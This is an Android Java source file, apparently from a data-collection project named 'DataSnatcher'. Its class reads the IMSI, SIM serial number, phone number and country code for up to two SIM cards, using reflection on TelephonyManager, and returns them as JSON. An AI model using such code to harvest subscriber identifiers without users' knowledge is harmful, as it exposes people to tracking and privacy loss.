package com.example.DataSnatcher.collector.SimCardInfo;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.example.DataSnatcher.collector.IInfoCollector;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;

public class SimCardInfoCollector implements IInfoCollector {

    private static final String TAG = "SimCardInfoCollector";
    private final Context context;

    // 所需权限
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS // 获取号码需要
    };

    public SimCardInfoCollector(Context context) {
        if (context == null) {
            throw new IllegalArgumentException("Context 不能为 null");
        }
        this.context = context.getApplicationContext();
    }

    @Override
    public String getCategory() {
        return "SimCardInfo";
    }

    @Override
    public JSONObject collect() {
        JSONObject simInfoJson = new JSONObject();

        // 1. 检查权限
        boolean hasReadPhoneState = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
        boolean hasReadPhoneNumbers = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED;

        if (!hasReadPhoneState) {
            Log.w(TAG, "缺少必要权限: READ_PHONE_STATE. 无法收集 SIM 卡信息.");
            try {
                simInfoJson.put("error", "缺少 READ_PHONE_STATE 权限");
                simInfoJson.put("sim_count", 0);
            } catch (JSONException e) {
                Log.e(TAG, "将权限错误信息放入 JSON 时出错", e);
            }
            return simInfoJson;
        }
        if (!hasReadPhoneNumbers) {
            Log.w(TAG, "缺少权限 READ_PHONE_NUMBERS. 电话号码(numberX)可能无法获取。");
        }

        // 2. 获取系统服务
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (subscriptionManager == null || telephonyManager == null) {
            Log.e(TAG, "无法获取 SubscriptionManager 或 TelephonyManager");
            try {
                simInfoJson.put("error", "系统服务不可用");
                simInfoJson.put("sim_count", 0);
            } catch (JSONException e) { }
            return simInfoJson;
        }

        // 3. 获取活动 SIM 卡列表
        List<SubscriptionInfo> activeSubscriptionInfoList = null;
        try {
            // 需要 READ_PHONE_STATE 权限
            activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        } catch (SecurityException e) {
            Log.e(TAG, "获取活动订阅列表时发生 SecurityException。请检查 READ_PHONE_STATE 权限。", e);
            try {
                simInfoJson.put("error", "SecurityException: 无法获取订阅列表");
                simInfoJson.put("sim_count", 0);
            } catch (JSONException je) { }
            return simInfoJson;
        } catch (Exception e) {
            Log.e(TAG, "获取活动订阅列表时发生异常。", e);
            try {
                simInfoJson.put("error", "异常: 无法获取订阅列表 - " + e.getMessage());
                simInfoJson.put("sim_count", 0);
            } catch (JSONException je) { }
            return simInfoJson;
        }

        // 4. 处理 SIM 卡信息
        int simCount = (activeSubscriptionInfoList != null) ? activeSubscriptionInfoList.size() : 0;
        Log.d(TAG, "检测到 SIM 卡数量: " + simCount);

        try {
            simInfoJson.put("sim_count", simCount);

            if (simCount > 0 && activeSubscriptionInfoList != null) {
                // --- 处理 SIM 1 ---
                SubscriptionInfo sim1Info = activeSubscriptionInfoList.get(0);
                populateMinimalSimData(simInfoJson, telephonyManager, sim1Info, 1);

                if (simCount > 1) {
                    // --- 处理 SIM 2 ---
                    SubscriptionInfo sim2Info = activeSubscriptionInfoList.get(1);
                    populateMinimalSimData(simInfoJson, telephonyManager, sim2Info, 2);
                }
            } else {
                // 如果 simCount 为 0，确保对应的字段为空或不存在 (可选)
                // 如果需要明确空字段，可以在这里添加 put("", ...)
                Log.d(TAG, "没有活动的 SIM 卡信息需要处理。");
            }

        } catch (JSONException e) {
            Log.e(TAG, "构建最终 SIM 信息 JSON 时出错", e);
        } catch (Exception e) { // 捕获处理过程中的其他异常
            Log.e(TAG, "SIM 处理期间发生意外错误", e);
            try {
                // 可以选择覆盖之前的 sim_count 或添加一个通用错误
                simInfoJson.put("processing_error", "处理 SIM 卡信息时出错: " + e.getMessage());
            } catch (JSONException je) { }
        }

        return simInfoJson;
    }

    /**
     * 处理单个 SIM 卡信息，仅填充请求的字段。
     *
     * @param jsonObject      目标 JSON 对象
     * @param telephonyManager TelephonyManager 实例
     * @param subInfo         当前 SIM 卡的 SubscriptionInfo
     * @param simIndex        SIM 卡索引 (1 或 2)
     * @throws JSONException 如果 JSON 操作失败
     */
    @SuppressLint({"HardwareIds", "DiscouragedPrivateApi"})
    private void populateMinimalSimData(JSONObject jsonObject,
                                        TelephonyManager telephonyManager,
                                        SubscriptionInfo subInfo,
                                        int simIndex) throws JSONException {

        String imsi = "获取失败";
        String countryIso = ""; // 默认为空
        String serialNumber = "获取失败";
        String phoneNumber = "获取失败";

        if (subInfo != null) {
            int subId = subInfo.getSubscriptionId();
            Log.d(TAG, "开始处理 SIM " + simIndex + " (SubId: " + subId + ")");

            // 1. 获取 sim_country_iso (直接从 SubscriptionInfo 获取)
            countryIso = subInfo.getCountryIso() != null ? subInfo.getCountryIso() : "";

            // 2. 通过反射获取 imsi, sim_serial_number, number
            imsi = invokeSimpleTelephonyMethod(telephonyManager, "getSubscriberId", subId);
            serialNumber = invokeSimpleTelephonyMethod(telephonyManager, "getSimSerialNumber", subId);
            // 尝试获取号码，如果READ_PHONE_NUMBERS权限缺失，这里会返回权限错误
            phoneNumber = invokeSimpleTelephonyMethod(telephonyManager, "getLine1Number", subId);
            // 可以选择性地尝试备用方法名，如果第一个失败且返回“方法未找到”
            if ("方法未找到".equals(phoneNumber)) {
                Log.d(TAG,"尝试 getLine1NumberForSubscriber 作为备用方法获取号码 for SubId " + subId);
                phoneNumber = invokeSimpleTelephonyMethod(telephonyManager, "getLine1NumberForSubscriber", subId);
            }

        } else {
            Log.w(TAG, "SIM 索引 " + simIndex + " 的 SubscriptionInfo 为 null。");
            // 设置默认的失败/空值
            imsi = "N/A (无 SubInfo)";
            serialNumber = "N/A (无 SubInfo)";
            phoneNumber = "N/A (无 SubInfo)";
            countryIso = "N/A (无 SubInfo)";
        }

        // --- 填充 JSON 对象 (严格按照要求的 key) ---
        jsonObject.put("imsi" + simIndex, imsi);
        jsonObject.put("sim_country_iso" + simIndex, countryIso);
        jsonObject.put("sim_serial_number" + simIndex, serialNumber);
        jsonObject.put("number" + simIndex, phoneNumber);
    }


    /**
     * 简化的反射调用辅助方法，用于调用 TelephonyManager 中接受一个 int 参数的方法。
     * 优先使用 getMethod 查找公共方法。
     *
     * @param telephonyManager TelephonyManager 实例
     * @param methodName      要调用的方法名
     * @param idParam         整数参数值 (例如 subId)
     * @return 方法调用的结果字符串，或表示错误的字符串。
     */
    private String invokeSimpleTelephonyMethod(TelephonyManager telephonyManager, String methodName, int idParam) {
        String result = "获取失败"; // 默认失败
        if (telephonyManager == null) {
            return result; // TelephonyManager 为 null，直接返回失败
        }

        try {
            Class<?> telephonyClass = telephonyManager.getClass();
            Method targetMethod = telephonyClass.getMethod(methodName, int.class); // 查找 public int 方法

            // 准备参数 (简化处理，假设参数总是 int)
            Object[] methodArgs = { idParam };

            // 调用方法
            Object invokeResult = targetMethod.invoke(telephonyManager, methodArgs);

            if (invokeResult != null) {
                result = invokeResult.toString();
                if (result.isEmpty()) {
                    result = "返回为空"; // 区分空和 null
                }
            } else {
                result = "返回为null"; // 区分 null
            }

        } catch (NoSuchMethodException e) {
            Log.w(TAG, "反射: 公共方法 " + methodName + "(int) 未找到。");
            result = "方法未找到";
        } catch (SecurityException e) {
            Log.e(TAG, "反射: 调用 " + methodName + "(int) 时发生 SecurityException。检查权限。", e);
            result = "权限被拒绝 (反射)";
        } catch (IllegalAccessException e) {
            Log.e(TAG, "反射: 非法访问 " + methodName + "(int)。", e);
            result = "非法访问";
        } catch (InvocationTargetException e) {
            Throwable cause = e.getCause();
            if (cause instanceof SecurityException) {
                Log.e(TAG, "反射: 调用 " + methodName + "(int) 时内部抛出 SecurityException。检查权限。", cause);
                result = "权限被拒绝 (反射)";
            } else {
                Log.e(TAG, "反射: 调用 " + methodName + "(int) 时发生内部异常。", cause != null ? cause : e);
                result = "反射调用错误";
            }
        } catch (Exception e) {
            Log.e(TAG, "反射 (" + methodName + ") 时发生意外错误", e);
            result = "意外错误";
        }

        return result;
    }

    /**
     * 辅助方法：检查所有必需的权限是否都已授予。
     */
    public static boolean hasRequiredPermissions(Context context) {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "缺少权限: " + permission);
                // 在 R (API 30) 之前，READ_PHONE_NUMBERS 可能不是严格必需的，但如果声明了最好还是检查
                if (permission.equals(Manifest.permission.READ_PHONE_NUMBERS) && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                    // 可以选择 continue 跳过检查，但如果 App target R+，缺失仍然可能导致问题
                    Log.i(TAG,"在 API < 30 设备上检查 READ_PHONE_NUMBERS 权限（可能非必需）。");
                    // continue;
                }
                return false; // 发现缺少权限（或决定严格要求所有声明的权限）
            }
        }
        return true;
    }
}